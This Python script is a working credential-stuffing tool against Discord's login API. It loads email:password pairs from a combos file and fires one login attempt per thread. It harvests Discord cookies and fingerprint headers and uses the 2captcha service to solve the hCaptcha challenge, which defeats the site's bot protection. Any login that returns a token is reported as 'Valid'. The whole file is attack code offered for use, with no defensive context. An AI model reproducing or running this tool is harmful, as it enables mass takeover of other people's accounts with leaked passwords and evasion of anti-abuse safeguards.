import captchatools, threading, requests, json, time

from captchatools import captcha_harvesters, exceptions
from concurrent.futures import ThreadPoolExecutor

with open('config.json') as r:
	config = json.load(r)

def getCookies():
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        }

        response = requests.get('https://discord.com/api/v9/experiments', headers=headers)
        return response.cookies, response.json().get("fingerprint")

        
def crack(combos):
            lcookies, fingerprint = getCookies()
            cookies = {
                '__dcfduid': lcookies.get('__dcfduid'),
                '__sdcfduid': lcookies.get('__sdcfduid'),
                '__cfruid': lcookies.get('__cfruid'),
                'locale': 'en-US',
            }
            email, password = combos.split(":")

            solver = captcha_harvesters(solving_site="2captcha", api_key=f"{config.get('captchakey')}", sitekey="f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34", captcha_type="hcap", captcha_url="https://discord.com/api/v9/auth/login")
            captcha_key = solver.get_token()

            payload = {
                'email': email,
                'password': password,
                'captcha_key': captcha_key
            }

            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'content-length': "371",
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                'X-Fingerprint': fingerprint
            }

            r = requests.post("https://discord.com/api/v9/auth/login", json = payload, headers = headers, cookies = cookies)
            if "errors" in r.text:
                   print(r.text)
            if "token" in r.text:
                   print("Valid")

def main():
        combos = open("combos.txt", "r").read().splitlines()
        for i in combos:
            cracker = threading.Thread(target=crack, args=(i,))
            cracker.start()

if __name__ == '__main__':
        main()